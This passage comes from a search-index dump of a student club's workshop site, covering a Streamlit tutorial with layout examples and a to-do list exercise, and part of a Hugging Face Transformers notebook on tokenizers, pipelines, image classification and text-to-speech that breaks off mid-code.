apps.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#installing-plotly","title":"Installing Plotly: \u2b50\u00b6","text":"<pre><code>!pip install -q plotly\n</code></pre> <p>Streamlit seamlessly integrates with popular data visualization libraries like Plotly, Matplotlib, and Altair. These libraries allow you to create various types of charts, graphs, and plots. For this section, we'll focus on using Plotly, a powerful and interactive plotting library.</p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#creating-intractive-chart","title":"Creating Intractive Chart: \ud83d\udcc8\u00b6","text":"<p>Let's build a Streamlit app that displays an interactive Plotly chart. In this example, we'll create a simple line chart:</p> <pre>import streamlit as st\nimport plotly.express as px\n\n# Sample data\ndata = {\n    'Time': [1, 2, 3, 4, 5], # 'Month': ['Jan', 'Feb', ...]\n    'Value': [10, 16, 5, 11, 8] # 'Sales': [12000, 15000, ...]\n}\n\n# Create a Plotly figure\nfig = px.line(data, x='Time', y='Value', title='Sample Line Chart') # x='Month', y='Sales', title='Monthly Sales Trend'\n\n# Display the chart in Streamlit\nst.plotly_chart(fig)\n</pre> <p>In this code, we import Streamlit and Plotly Express,  define sample data as a dictionary, then create a Plotly line chart using Plotly Express and finally use 'st.plotly_chart' to display the chart in our Streamlit app.</p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#customizing-the-layout","title":"Customizing the Layout: \ud83e\udde0\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#in-this-section-of-the-workshop-well-explore-how-to-customize-the-layout-of-your-streamlit-apps-you-can-use-markdown-and-html-to-format-text-and-create-structured-content-additionally-streamlit-provides-tools-like-columns-and-widgets-for-organizing-your-apps-interface-effectively","title":"In this section of the workshop, we'll explore how to customize the layout of your Streamlit apps. You can use Markdown and HTML to format text and create structured content. Additionally, Streamlit provides tools like columns and widgets for organizing your app's interface effectively.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#using-markdown-and-html","title":"Using Markdown and HTML:\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#streamlit-allows-you-to-use-markdown-and-even-html-to-format-text-and-create-structured-content-within-your-app","title":"Streamlit allows you to use Markdown and even HTML to format text and create structured content within your app.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#markdown-example","title":"Markdown Example:\u00b6","text":"<pre>import streamlit as st\n\n# Markdown\nst.markdown(\"# This is a Heading\")\nst.markdown(\"## This is a Subheading\")\nst.markdown(\"This is a paragraph of text with **bold** and *italic* formatting.\")\n</pre>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#html-example","title":"HTML Example:\u00b6","text":"<pre>import streamlit as st\n\n# HTML\nst.write(\"&lt;h1&gt;This is an HTML Heading&lt;/h1&gt;\", unsafe_allow_html=True)\nst.write(\"&lt;p&gt;This is a paragraph of text with &lt;strong&gt;bold&lt;/strong&gt; and &lt;em&gt;italic&lt;/em&gt; formatting.&lt;/p&gt;\", unsafe_allow_html=True)\n</pre> <p>You can use Markdown for basic formatting and HTML for more advanced customization when needed. Just remember to set 'unsafe_allow_html=True' to allow rendering HTML in Streamlit.</p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#organising-with-columns","title":"Organising with Columns:\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#columns-are-a-powerful-way-to-organize-your-apps-layout-you-can-use-stcolumns-to-create-multiple-columns-and-distribute-content-accordingly-heres-an-example","title":"Columns are a powerful way to organize your app's layout. You can use 'st.columns()' to create multiple columns and distribute content accordingly. Here's an example:\u00b6","text":"<pre>import streamlit as st\n\n# Create two columns\ncol1, col2 = st.columns(2)\n\n# Add content to each column\nwith col1:\n    st.header(\"Column 1\")\n    st.write(\"This is the left column.\")\n\nwith col2:\n    st.header(\"Column 2\")\n    st.write(\"This is the right column.\")\n</pre>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#widgets-for-better-organization","title":"Widgets for Better Organization:\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#widgets-can-be-used-for-interactive-elements-and-better-organization-you-can-group-related-widgets-together-and-use-them-to-collect-user-input-effectively","title":"Widgets can be used for interactive elements and better organization. You can group related widgets together and use them to collect user input effectively.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#ex-registration-form","title":"(ex: Registration Form)\u00b6","text":"<pre>import streamlit as st\n\n# Create a widget group\nwith st.expander(\"Click to expand\"):\n    st.write(\"This content is hidden by default.\")\n    name = st.text_input(\"Enter your name:\")\n    age = st.slider(\"Select your age:\", 0, 100, 25)\n    submit_button = st.button(\"Submit\")\n\n# Perform actions based on user input\nif submit_button:\n    st.write(f\"Hello, {name}! You are {age} years old.\")\n</pre>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#in-this-example","title":"In this example:\u00b6","text":"<p>We use 'st.expander' to create an expandable widget group. Inside the group, we add text input, slider, and button widgets. The content is hidden until the user clicks to expand it.</p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#deploying-streamlit-apps","title":"Deploying Streamlit Apps: \u2601\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#in-this-section-of-the-workshop-well-discuss-the-essential-topic-of-deploying-your-streamlit-apps-so-that-they-can-be-accessed-by-others-deploying-your-app-makes-it-accessible-over-the-internet-allowing-you-to-share-your-work-with-a-broader-audience-or-colleagues-well-briefly-explore-deployment-options-focusing-on-one-of-the-popular-methodsstreamlit-sharing-cloud","title":"In this section of the workshop, we'll discuss the essential topic of deploying your Streamlit apps so that they can be accessed by others. Deploying your app makes it accessible over the internet, allowing you to share your work with a broader audience or colleagues. We'll briefly explore deployment options, focusing on one of the popular methods\u2014Streamlit Sharing Cloud.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#1-make-an-account-if-you-dont-already-have-one","title":"1. Make an account if you dont already have one:\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#github-website","title":"GitHub Website\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#2-create-a-new-public-repository","title":"2. Create a new Public Repository.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#3-create-an-apppy-containing-the-main-code-for-the-website","title":"3. Create an 'app.py' containing the main code for the website.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#4-create-a-requirementstxt-containing-all-the-dependencies","title":"4. Create a 'requirements.txt' containing all the dependencies.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#use-the-following-command-to-get-the-version-of-the-installed-package","title":"Use the following command to get the version of the installed package:\u00b6","text":"<pre><code>!pip show streamlit\n</code></pre>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#add-the-package-to-the-requirementstxt-in-the-following-format","title":"Add the package to the 'requirements.txt' in the following format:\u00b6","text":"<pre><code>streamlit==1.27.0\n</code></pre>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#5-connect-streamlit-cloud-and-your-github","title":"5. Connect Streamlit Cloud and your GitHub:\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#streamlit-cloud","title":"Streamlit Cloud\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#6-select-your-public-repo-to-host-and-select-the-appropriate-branch-and-the-main-code-file","title":"6. Select your Public Repo to Host, and Select the appropriate branch and the Main Code file.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#7-press-deploy-and-watch-the-magic-happen","title":"7. Press 'DEPLOY' and watch the Magic happen \ud83c\udf1f\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#do-it-yourself","title":"Do it Yourself \ud83d\udcaa\u00b6","text":"<p>In this optional part of the workshop, we'll provide you with a hands-on exercise to apply what you've learned about Streamlit. This exercise will give you the opportunity to create a small Streamlit app from scratch. If you have any questions or need assistance during the exercise, please feel free to ask for help.</p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#exercise","title":"Exercise:\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#objective-create-a-streamlit-app-that-takes-user-input-for-a-simple-task-and-provides-a-response","title":"Objective: Create a Streamlit app that takes user input for a simple task and provides a response.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#task-build-a-basic-to-do-list-app-users-should-be-able-to-enter-a-task-click-a-button-to-add-it-to-the-list-and-see-their-tasks-displayed","title":"Task: Build a basic to-do list app. Users should be able to enter a task, click a button to add it to the list, and see their tasks displayed.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#hints","title":"Hints: \ud83d\udd0e\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#use-sttext_input-to-collect-task-input-from-the-user","title":"Use st.text_input to collect task input from the user.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#create-a-button-using-stbutton-to-add-tasks-to-the-list","title":"Create a button using st.button to add tasks to the list.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#use-a-list-to-keep-track-of-tasks","title":"Use a list to keep track of tasks.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#use-stsession_state-to-store-the-tasks-refer-the-streamlit-docs-session-state-docs","title":"Use 'st.session_state' to store the tasks (refer the streamlit docs: Session State Docs)\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#display-the-tasks-in-the-streamlit-app-using-stwrite-or-a-more-structured-layout-if-you-prefer","title":"Display the tasks in the Streamlit app using st.write or a more structured layout if you prefer.\u00b6","text":""},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#sample-code","title":"Sample Code:\u00b6","text":"<pre>import streamlit as st\n\n# Create an empty list to store tasks\ntasks = []\n# See the difference between a normal variable and session_state variable.\n\n# Collect task input from the user\ntask_input = st.text_input(\"Enter a task:\")\n\n# Add task to the list when the button is clicked\nif st.button(\"Add Task\"):\n    tasks.append(task_input)\n\n# Display the list of tasks\nst.write(\"Tasks:\")\nfor i, task in enumerate(tasks):\n    st.write(f\"{i + 1}. {task}\")\n</pre>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#answer","title":"Answer: \u2705\u00b6","text":"<pre>import streamlit as st\n\n# Title\nst.title(\"To-Do List\")\n\n# Input field for task\ntask = st.text_input(\"Enter a new task:\")\n\n# Button to add task\nif st.button(\"Add Task\"):\n    if task:\n        st.write(f\"Added: {task}\")\n\n# List to display tasks\ntask_list = st.empty()\n\n# Initialize task list\nif 'tasks' not in st.session_state:\n    st.session_state.tasks = []\n\n# Add task to the list\nif task:\n    st.session_state.tasks.append(task)\n\n# Display tasks\nif st.session_state.tasks:\n    task_list.write(\"## Tasks:\")\n    for i, t in enumerate(st.session_state.tasks):\n        task_list.write(f\"{i+1}. {t}\")\n\n# Checkbox to clear tasks\nif st.checkbox(\"Clear Tasks\"):\n    st.session_state.tasks = []\n</pre>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#what-the-code-does","title":"What the Code does:\u00b6","text":"<ul> <li>It creates a Streamlit app titled \"To-Do List.\"</li> <li>It provides an input field for entering a new task.</li> <li>When the \"Add Task\" button is clicked, it adds the task to a list if it's not empty.</li> <li>It uses the st.empty() element to reserve a spot for displaying tasks.</li> <li>It initializes an empty list to store tasks in the Streamlit session state.</li> <li>It adds tasks to the session state list when the \"Add Task\" button is clicked.</li> <li>It displays the list of tasks using a loop.</li> <li>It provides a \"Clear Tasks\" checkbox to clear all tasks.</li> </ul> <p>This code provides a simple to-do list that allows you to add tasks and clear them as needed. You can expand upon this basic example to add more features and functionality to your to-do list app.</p>"},{"location":"2023-2024/Workshops/01_Streamlit_Workshop/#thank-you-everyone","title":"Thank-you Everyone ! \ud83c\udf89\ud83c\udf89\ud83c\udf89\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/","title":"Hugging Face \ud83e\udd17","text":"<ul> <li>An open-source organization founded in 2016</li> <li>Revolves around developing tools and resources for natural language processing and machine learning tasks.</li> <li>Over 350k models, 75k datasets, and 150k demo apps.</li> <li>\"Hugging Face is to machine learning what github is to software engineering\"</li> </ul> <ul> <li>Easy-to-use APIs and pipelines</li> <li>Tons of pre-trained models</li> <li>Ability to fine tune models to suit your purpose</li> <li>Organizations such as Google, Microsoft, AWS, Nvidia, Facebook and many more are using Hugging Face</li> </ul> <p>Website link - https://huggingface.co</p> <p></p> In\u00a0[\u00a0]: Copied! <pre>!pip install -q transformers\n</pre> !pip install -q transformers <p>Transformers is a library which provides tools and API for accessing pre trained models.</p> <p>But before we continue, let's talk about Transformers!</p> <p>One is a python library while the other is a breakthrough neural network architecture</p> <p></p> <p>For more reference about the architecture, click here</p> <p>Tokenizers are used to convert the input text to an array of numbers</p> In\u00a0[\u00a0]: Copied! <pre>from transformers import AutoTokenizer\n\n# https://huggingface.co/nlptown/bert-base-multilingual-uncased-sentiment\ntokenizer_1 = AutoTokenizer.from_pretrained(\"nlptown/bert-base-multilingual-uncased-sentiment\")\n\n# https://huggingface.co/bert-base-uncased\ntokenizer_2 = AutoTokenizer.from_pretrained(\"bert-base-uncased\")\n\ntext = \"We are very happy to show you the very famous \ud83e\udd17 Transformers library.\"\n\nencoding_1 = tokenizer_1([text,\"yes\"],max_length=12,padding=True)\nencoding_2 = tokenizer_2(text)\n\nprint('First tokenizer:')\nfor e in encoding_1:\n  print(str(e)+' : '+str(encoding_1[e]))\n\nprint('Second tokenizer:')\nfor e in encoding_2:\n  print(str(e)+' : '+str(encoding_2[e]))\n</pre> from transformers import AutoTokenizer  # https://huggingface.co/nlptown/bert-base-multilingual-uncased-sentiment tokenizer_1 = AutoTokenizer.from_pretrained(\"nlptown/bert-base-multilingual-uncased-sentiment\")  # https://huggingface.co/bert-base-uncased tokenizer_2 = AutoTokenizer.from_pretrained(\"bert-base-uncased\")  text = \"We are very happy to show you the very famous \ud83e\udd17 Transformers library.\"  encoding_1 = tokenizer_1([text,\"yes\"],max_length=12,padding=True) encoding_2 = tokenizer_2(text)  print('First tokenizer:') for e in encoding_1:   print(str(e)+' : '+str(encoding_1[e]))  print('Second tokenizer:') for e in encoding_2:   print(str(e)+' : '+str(encoding_2[e])) <pre>First tokenizer:\ninput_ids : [[101, 11312, 10320, 12495, 19308, 10114, 11391, 10855, 10103, 12495, 17377, 100, 58263, 13299, 119, 102], [101, 31617, 102, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]\ntoken_type_ids : [[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]\nattention_mask : [[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], [1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]\nSecond tokenizer:\ninput_ids : [101, 2057, 2024, 2200, 3407, 2000, 2265, 2017, 1996, 2200, 3297, 100, 19081, 3075, 1012, 102]\ntoken_type_ids : [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nattention_mask : [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\n</pre> <pre>/usr/local/lib/python3.10/dist-packages/transformers/tokenization_utils_base.py:2632: UserWarning: `max_length` is ignored when `padding`=`True` and there is no truncation strategy. To pad to max length, use `padding='max_length'`.\n  warnings.warn(\n</pre> In\u00a0[\u00a0]: Copied! <pre>encoding_1 = tokenizer_1([\"Welcome to the session\",\"Enjoy\"],max_length=20,padding=True)\nfor e in encoding_1:\n  print(str(e)+' : '+str(encoding_1[e]))\n</pre> encoding_1 = tokenizer_1([\"Welcome to the session\",\"Enjoy\"],max_length=20,padding=True) for e in encoding_1:   print(str(e)+' : '+str(encoding_1[e])) <pre>input_ids : [[101, 32252, 10114, 10103, 23734, 102], [101, 61530, 102, 0, 0, 0]]\ntoken_type_ids : [[0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0]]\nattention_mask : [[1, 1, 1, 1, 1, 1], [1, 1, 1, 0, 0, 0]]\n</pre> In\u00a0[\u00a0]: Copied! <pre>from transformers import AutoTokenizer\n\ntokenizer = AutoTokenizer.from_pretrained(\"bert-base-uncased\")\n\nseq = \"Welcome to BITS\"\nprint(tokenizer(seq))\n</pre> from transformers import AutoTokenizer  tokenizer = AutoTokenizer.from_pretrained(\"bert-base-uncased\")  seq = \"Welcome to BITS\" print(tokenizer(seq)) <pre>{'input_ids': [101, 6160, 2000, 9017, 102], 'token_type_ids': [0, 0, 0, 0, 0], 'attention_mask': [1, 1, 1, 1, 1]}\n</pre> In\u00a0[\u00a0]: Copied! <pre>seq = tokenizer(\"Welcome to the session\", \"Hope you have a good time!\")\nfor key, value in seq.items():\n    print(f\"{key}: {value}\")\n</pre> seq = tokenizer(\"Welcome to the session\", \"Hope you have a good time!\") for key, value in seq.items():     print(f\"{key}: {value}\") <pre>input_ids: [101, 6160, 2000, 1996, 5219, 102, 3246, 2017, 2031, 1037, 2204, 2051, 999, 102]\ntoken_type_ids: [0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1]\nattention_mask: [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\n</pre> <p>NOTE : 'AutoTokenizer' module only works on textual data. To process image and audio into the correct format, use 'AutoImageProcessor' and 'AutoFeatureExtractor' respectively</p> <p>Pipeline module makes it very easy to access pre-trained model from the hub</p> In\u00a0[\u00a0]: Copied! <pre>from transformers import pipeline\n\nclassifier = pipeline(\"sentiment-analysis\")\n\nclassifier(\"We are very happy to show you the \ud83e\udd17 Transformers library.\")\n</pre> from transformers import pipeline  classifier = pipeline(\"sentiment-analysis\")  classifier(\"We are very happy to show you the \ud83e\udd17 Transformers library.\") <pre>No model was supplied, defaulted to distilbert-base-uncased-finetuned-sst-2-english and revision af0f99b (https://huggingface.co/distilbert-base-uncased-finetuned-sst-2-english).\nUsing a pipeline without specifying a model name and revision in production is not recommended.\n</pre> Out[\u00a0]: <pre>[{'label': 'POSITIVE', 'score': 0.9997795224189758}]</pre> <p>Parameters -</p> <ol> <li>model</li> <li>task</li> <li>tokenizer</li> <li>batch_size</li> <li>device</li> </ol> In\u00a0[\u00a0]: Copied! <pre>from transformers import AutoTokenizer, AutoModelForSequenceClassification\n\ntokenizer = AutoTokenizer.from_pretrained(\"typeform/distilbert-base-uncased-mnli\")\nmodel = AutoModelForSequenceClassification.from_pretrained(\"typeform/distilbert-base-uncased-mnli\")\n\nsa_pipeline = pipeline(\n    task=\"sentiment-analysis\",\n    model=model,\n    tokenizer=tokenizer,\n    batch_size=32,\n    device=-1\n    )\n\nsentence = \"I love this movie!\"\nsentiment = sa_pipeline(sentence)\n\nprint(sentiment)\n</pre> from transformers import AutoTokenizer, AutoModelForSequenceClassification  tokenizer = AutoTokenizer.from_pretrained(\"typeform/distilbert-base-uncased-mnli\") model = AutoModelForSequenceClassification.from_pretrained(\"typeform/distilbert-base-uncased-mnli\")  sa_pipeline = pipeline(     task=\"sentiment-analysis\",     model=model,     tokenizer=tokenizer,     batch_size=32,     device=-1     )  sentence = \"I love this movie!\" sentiment = sa_pipeline(sentence)  print(sentiment)  <pre>The `xla_device` argument has been deprecated in v4.4.0 of Transformers. It is ignored and you can safely remove it from your `config.json` file.\nThe `xla_device` argument has been deprecated in v4.4.0 of Transformers. It is ignored and you can safely remove it from your `config.json` file.\nThe `xla_device` argument has been deprecated in v4.4.0 of Transformers. It is ignored and you can safely remove it from your `config.json` file.\nThe `xla_device` argument has been deprecated in v4.4.0 of Transformers. It is ignored and you can safely remove it from your `config.json` file.\n</pre> <pre>[{'label': 'ENTAILMENT', 'score': 0.6847606301307678}]\n</pre> <p>To view list of accepted tasks visit https://huggingface.co/docs/transformers/main_classes/pipelines#transformers.pipeline.task</p> <p>What is architecture and what are checkpoints? (BERT and bert-base-uncased)</p> <ul> <li>BERT is a modified-transformers based architecture.</li> <li>bert-base-uncased is a pretrained model on english language and based on BERT architecture. (https://huggingface.co/bert-base-uncased)</li> </ul> In\u00a0[\u00a0]: Copied! <pre>from transformers import pipeline\n\npipe = pipeline(\"fill-mask\", model=\"bert-base-uncased\")\n\ntext = \"Delhi is [MASK] of India.\"\nprediction = pipe(text)\nfor p in prediction:\n  print(p)\n</pre> from transformers import pipeline  pipe = pipeline(\"fill-mask\", model=\"bert-base-uncased\")  text = \"Delhi is [MASK] of India.\" prediction = pipe(text) for p in prediction:   print(p) <pre>Some weights of the model checkpoint at bert-base-uncased were not used when initializing BertForMaskedLM: ['bert.pooler.dense.bias', 'cls.seq_relationship.bias', 'bert.pooler.dense.weight', 'cls.seq_relationship.weight']\n- This IS expected if you are initializing BertForMaskedLM from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).\n- This IS NOT expected if you are initializing BertForMaskedLM from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).\n</pre> <pre>{'score': 0.9531505107879639, 'token': 3007, 'token_str': 'capital', 'sequence': 'delhi is capital of india.'}\n{'score': 0.025008611381053925, 'token': 2110, 'token_str': 'state', 'sequence': 'delhi is state of india.'}\n{'score': 0.00889446958899498, 'token': 2112, 'token_str': 'part', 'sequence': 'delhi is part of india.'}\n{'score': 0.0013557332567870617, 'token': 2103, 'token_str': 'city', 'sequence': 'delhi is city of india.'}\n{'score': 0.0013061006320640445, 'token': 3072, 'token_str': 'republic', 'sequence': 'delhi is republic of india.'}\n</pre> In\u00a0[\u00a0]: Copied! <pre>from transformers import pipeline\n\npipe = pipeline(\"text-classification\", model=\"distilbert-base-uncased-finetuned-sst-2-english\")\n</pre> from transformers import pipeline  pipe = pipeline(\"text-classification\", model=\"distilbert-base-uncased-finetuned-sst-2-english\") In\u00a0[\u00a0]: Copied! <pre># results = pipe('I feel very happy')\nresults = pipe(['I am not enjoying','I feel very happy'])\n\n# results[0]['label']\nresults\n</pre> # results = pipe('I feel very happy') results = pipe(['I am not enjoying','I feel very happy'])  # results[0]['label'] results Out[\u00a0]: <pre>[{'label': 'NEGATIVE', 'score': 0.9996455907821655},\n {'label': 'POSITIVE', 'score': 0.999884843826294}]</pre> In\u00a0[\u00a0]: Copied! <pre># Use a pipeline as a high-level helper\nfrom transformers import pipeline\nfrom PIL import Image\nimport requests\n\n# https://huggingface.co/google/vit-base-patch16-224\npipe = pipeline(\"image-classification\", model=\"google/vit-base-patch16-224\")\n\nurl = 'http://images.cocodataset.org/val2017/000000039769.jpg'\nimage = Image.open(requests.get(url, stream=True).raw)\n</pre> # Use a pipeline as a high-level helper from transformers import pipeline from PIL import Image import requests  # https://huggingface.co/google/vit-base-patch16-224 pipe = pipeline(\"image-classification\", model=\"google/vit-base-patch16-224\")  url = 'http://images.cocodataset.org/val2017/000000039769.jpg' image = Image.open(requests.get(url, stream=True).raw) In\u00a0[\u00a0]: Copied! <pre>results = pipe(image)\nresults\n</pre> results = pipe(image) results Out[\u00a0]: <pre>[{'score': 0.9374414086341858, 'label': 'Egyptian cat'},\n {'score': 0.038442570716142654, 'label': 'tabby, tabby cat'},\n {'score': 0.014411387033760548, 'label': 'tiger cat'},\n {'score': 0.0032743187621235847, 'label': 'lynx, catamount'},\n {'score': 0.0006795920198783278, 'label': 'Siamese cat, Siamese'}]</pre> In\u00a0[\u00a0]: Copied! <pre>from transformers import ViTImageProcessor, ViTForImageClassification\nfrom PIL import Image\nimport requests\n\nurl = 'http://images.cocodataset.org/val2017/000000039769.jpg'\nimage = Image.open(requests.get(url, stream=True).raw)\n\n\nprocessor = ViTImageProcessor.from_pretrained('google/vit-base-patch16-224')\nmodel = ViTForImageClassification.from_pretrained('google/vit-base-patch16-224')\n\ninputs = processor(images=image, return_tensors=\"pt\")\noutputs = model(**inputs)\nlogits = outputs.logits\n# model predicts one of the 1000 ImageNet classes\npredicted_class_idx = logits.argmax(-1).item()\nprint(\"Predicted class:\", model.config.id2label[predicted_class_idx])\n</pre> from transformers import ViTImageProcessor, ViTForImageClassification from PIL import Image import requests  url = 'http://images.cocodataset.org/val2017/000000039769.jpg' image = Image.open(requests.get(url, stream=True).raw)   processor = ViTImageProcessor.from_pretrained('google/vit-base-patch16-224') model = ViTForImageClassification.from_pretrained('google/vit-base-patch16-224')  inputs = processor(images=image, return_tensors=\"pt\") outputs = model(**inputs) logits = outputs.logits # model predicts one of the 1000 ImageNet classes predicted_class_idx = logits.argmax(-1).item() print(\"Predicted class:\", model.config.id2label[predicted_class_idx])  <pre>Predicted class: Egyptian cat\n</pre> In\u00a0[\u00a0]: Copied! <pre>!pip install -q fairseq\n!pip install -q g2p_en\n!pip install huggingface-hub\n</pre> !pip install -q fairseq !pip install -q g2p_en !pip install huggingface-hub <pre>Requirement already satisfied: huggingface-hub in /usr/local/lib/python3.10/dist-packages (0.19.3)\nRequirement already satisfied: filelock in /usr/local/lib/python3.10/dist-packages (from huggingface-hub) (3.13.1)\nRequirement already satisfied: fsspec&gt;=2023.5.0 in /usr/local/lib/python3.10/dist-packages (from huggingface-hub) (2023.6.0)\nRequirement already satisfied: requests in /usr/local/lib/python3.10/dist-packages (from huggingface-hub) (2.31.0)\nRequirement already satisfied: tqdm&gt;=4.42.1 in /usr/local/lib/python3.10/dist-packages (from huggingface-hub) (4.66.1)\nRequirement already satisfied: pyyaml&gt;=5.1 in /usr/local/lib/python3.10/dist-packages (from huggingface-hub) (6.0.1)\nRequirement already satisfied: typing-extensions&gt;=3.7.4.3 in /usr/local/lib/python3.10/dist-packages (from huggingface-hub) (4.5.0)\nRequirement already satisfied: packaging&gt;=20.9 in /usr/local/lib/python3.10/dist-packages (from huggingface-hub) (23.2)\nRequirement already satisfied: charset-normalizer&lt;4,&gt;=2 in /usr/local/lib/python3.10/dist-packages (from requests-&gt;huggingface-hub) (3.3.2)\nRequirement already satisfied: idna&lt;4,&gt;=2.5 in /usr/local/lib/python3.10/dist-packages (from requests-&gt;huggingface-hub) (3.4)\nRequirement already satisfied: urllib3&lt;3,&gt;=1.21.1 in /usr/local/lib/python3.10/dist-packages (from requests-&gt;huggingface-hub) (2.0.7)\nRequirement already satisfied: certifi&gt;=2017.4.17 in /usr/local/lib/python3.10/dist-packages (from requests-&gt;huggingface-hub) (2023.7.22)\n</pre> In\u00a0[\u00a0]: Copied! <pre># https://huggingface.co/facebook/fastspeech2-en-200_speaker-cv4\nfrom fairseq.checkpoint_utils import load_model_ensemble_and_task_from_hf_hub\nfrom fairseq.models.text_to_speech.hub_interface import TTSHubInterface\nimport IPython.display as ipd\n\n\nmodels, cfg, task = load_model_ensemble_and_task_from_hf_hub(\n    \"facebook/fastspeech2-en-200_speaker-cv4\",\n    arg_overrides={\"vocoder\": \"hifigan\", \"fp16\": False}\n)\nmodel = models[0]\nTTSHubInterface.update_cfg_with_data_cfg(cfg, task.data_cfg)\n\ngenerator = task.build_generator([model], cfg)\n</pre> # https://huggingface.co/facebook/fastspeech2-en-200_speaker-cv4 from fairseq.checkpoint_utils import load_model_ensemble_and_task_from_hf_hub from fairseq.models.text_to_speech.hub_interface import TTSHubInterface import IPython.display as ipd   models, cfg, task = load_model_ensemble_and_task_from_hf_hub(     \"facebook/fastspeech2-en-200_speaker-cv4\",     arg_overrides={\"vocoder\": \"hifigan\", \"fp16\": False} ) model = models[0] TTSHubInterface.update_cfg_with_data_cfg(cfg, task.data_cfg)  generator = task.build_generator([model], cfg)  <pre>Fetching 9 files:   0%|          | 0/9 [00:00&lt;?, ?it/s]</pre> <pre>/usr/local/lib/python3.10/dist-packages/torch/nn/utils/weight_norm.py:30: UserWarning: torch.nn.utils.weight_norm is deprecated in favor of torch.nn.utils.parametrizations.weight_norm.\n  warnings.warn(\"torch.nn.utils.weight_norm is deprecated in favor of torch.nn.utils.parametrizations.weight_norm.\")\n</pre> In\u00a0[\u00a0]: Copied! <pre># text = \"Hello, this is a test run.\"\ntext = \"Google Developer Student Club BITS Pilani Dubai\"\n\nsample = TTSHubInterface.get_model_input(task, text)\nwav, rate = TTSHubInterface.get_prediction(task, model, generator, sample)\n\nipd.Audio(wav, rate=rate)\n</pre> # text = \"Hello, this is a test run.\" text = \"Google Developer Student Club BITS Pilani Dubai\"  sample = TTSHubInterface.get_model_input(task, text) wav, rate = TTSHubInterface.get_prediction(task, model, generator, sample)  ipd.Audio(wav, rate=rate) Out[\u00a0]:                      Your browser does not support the audio element.                  In\u00a0[\u00a0]: Copied! <pre>!pip install -q streamlit\n</pre> !pip install -q streamlit In\u00a0[\u00a0]: Copied! <pre>%%writefile generic_chatbot.py\nimport streamlit as st\nimport random\nimport time\nfrom transformers import pipeline, Conversation\n\nchatbot = pipeline(model=\"facebook/blenderbot-400M-distill\")\n\nmessage_list = []\nresponse_list = []\n\nst.title(\"Generic Chatbot\")\n\n# Initialize chat history\nif \"messages\" not in st.session_state:\n    st.session_state.messages = []\n\n# Display chat messages from history on app rerun\nfor message in st.session_state.messages:\n    with st.chat_message(message[\"role\"],avatar=message[\"avatar\"]):\n        st.markdown(message[\"content\"])\n\n# Accept user input\nif prompt := st.chat_input(\"Enter something...\"):\n    # Add user message to chat history\n    st.session_state.messages.append({\"role\": \"user\", \"content\": prompt,\"avatar\":\"\ud83e\udd17\"})\n    # Display user message in chat message container\n    with st.chat_message(\"user\",avatar='\ud83e\udd17'):\n        st.markdown(prompt)\n\n    # Display assistant response in chat message container\n    with st.chat_message(\"assistant\",avatar='\ud83e\udd16'):\n        